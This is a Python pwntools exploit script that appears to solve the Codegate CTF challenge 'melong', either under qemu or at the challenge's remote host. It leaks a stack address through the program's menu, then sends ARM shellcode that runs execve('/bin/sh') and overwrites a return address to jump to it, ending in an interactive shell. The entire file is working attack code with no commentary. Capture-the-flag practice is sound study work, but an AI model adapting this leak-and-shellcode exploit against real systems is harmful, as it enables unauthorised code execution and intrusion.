#!/usr/bin/env python
from pwn import *

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process(['qemu-arm','-L','/usr/arm-linux-gnueabihf/', 'melong'])
    else:
        s = remote('ch41l3ng3s.codegate.kr',1199)

    context.arch = 'arm'

    # 1
    s.sendline('1')
    s.sendline('1')
    s.sendline('100')

    # 1
    s.sendline('1')
    s.sendline('1')
    s.sendline('100')

    # 3
    s.sendline('3')
    s.sendline('-1')

    # 4
    s.sendline('4')
    s.send('\xff' * 0x5c)
    s.recvuntil('\xff' * 0x5c)
    stack_addr = u32(s.recv(4)) - 0x1ac
    log.info('stack address: %#x' % stack_addr)
    
    # 4
    s.sendline('4')
    payload = ''
    payload += asm("""
        movw r7, #0x68732f & 0xffff
        movt r7, #0x68732f >> 16
        push {r7}
        movw r7, #0x6e69622f & 0xffff
        movt r7, #0x6e69622f >> 16
        push {r7}
        mov  r0, sp
        movw r7, #0x6873
        push {r7}
        eor  r12, r12
        push {r12}
        mov  r1, #4
        add r1, sp
        mov  r12, r1
        push {r12}
        mov  r1, sp
        eor  r2, r2
        mov  r7, #SYS_execve
        svc  0
    """).ljust(0x54,'A')
    payload += p32(stack_addr)
    s.send(payload)
    time.sleep(0.1)
    s.sendline('6')
    s.recvuntil(':)\n')
    s.interactive()
